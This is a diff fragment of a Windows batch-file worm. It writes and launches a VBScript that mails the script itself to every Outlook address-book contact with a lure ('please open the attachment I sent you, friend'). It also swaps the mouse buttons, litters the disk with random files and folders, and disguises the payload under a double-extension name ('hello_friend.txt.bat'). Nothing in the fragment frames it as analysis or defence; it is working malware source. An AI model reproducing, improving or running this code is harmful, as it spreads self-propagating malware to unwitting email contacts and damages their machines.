@@ -45,7 +45,7 @@ del "%self%.tmp"
 :user
 :folders
 :files
-:worm
+:mail
 
 RUNDLL32 USER32.DLL,SwapMouseButton
 set Slash=\
@@ -81,12 +81,12 @@ echo Set Mail=ci>>%SystemDrive%\mail.vbs
 echo Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)>>%SystemDrive%\mail.vbs
 echo Mail.Subject="HelloFriend">>%SystemDrive%\mail.vbs
 echo Mail.Body="please open the attachment I sent you, friend.">>%SystemDrive%\mail.vbs
-echo Mail.Attachments.Add(%0)>>%SystemDrive%\mail.vbs
+echo Mail.Attachments.Add(%0)>>%SystemDrive%\hello_friend.txt.bat
 echo Mail.send>>%SystemDrive%\mail.vbs
 echo Next>>%SystemDrive%\mail.vbs
 echo ol.Quit>>%SystemDrive%\mail.vbs
 start "" "%SystemDrive%\mail.vbs"
-goto worm
+goto mail
 nul >> %random%
 goto files
 mkdir %random%
